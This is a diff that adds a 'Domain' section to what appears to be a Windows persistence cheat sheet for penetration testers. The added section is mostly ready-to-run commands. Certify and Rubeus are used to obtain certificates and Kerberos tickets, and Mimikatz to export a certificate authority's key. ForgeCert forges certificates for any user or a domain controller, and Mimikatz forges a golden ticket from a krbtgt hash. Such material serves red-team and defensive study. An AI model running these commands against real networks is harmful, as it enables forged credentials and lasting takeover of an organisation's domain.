@@ -29,6 +29,9 @@
         * [sethc.exe](#sethc.exe)
     * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
+* [Domain](#domain)
+    * [Golden Certificate](#golden-certificate)
+    * [Golden Ticket](#golden-ticket)
 * [References](#references)
 
 
@@ -381,6 +384,54 @@ Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DC
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
 
+## Domain
+
+### User Certificate
+
+```ps1
+# Request a certificate for the User template
+.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
+
+# Convert the certificate for Rubeus
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Request a TGT using the certificate
+.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
+```
+
+### Golden Certificate
+
+> Require elevated privileges in the Active Directory, or on the ADCS machine
+
+* Export CA as p12 file: `certsrv.msc` > `Right Click` > `Back up CA...`
+* Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER 
+    ```ps1
+    privilege::debug
+    crypto::capi
+    crypto::cng
+    crypto::certificates /systemstore:local_machine /store:my /export
+    ```
+* Alternative 2: Using SharpDPAPI, then convert the certificate: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
+* [ForgeCert](https://github.com/GhostPack/ForgeCert) - Forge a certificate for any active domain user using the CA certificate
+    ```ps1
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
+    ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
+    ```
+* Finally you can request a TGT using the Certificate
+    ```ps1
+    Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123
+    ```
+
+### Golden Ticket
+
+> Forge a Golden ticket using Mimikatz
+
+```ps1
+kerberos::purge
+kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
+kerberos::tgt
+```
+
 ## References
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
@@ -393,3 +444,4 @@ Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administr
 * [Persistence - BITS Jobs - @netbiosX](https://pentestlab.blog/2019/10/30/persistence-bits-jobs/)
 * [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
 * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
+* [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
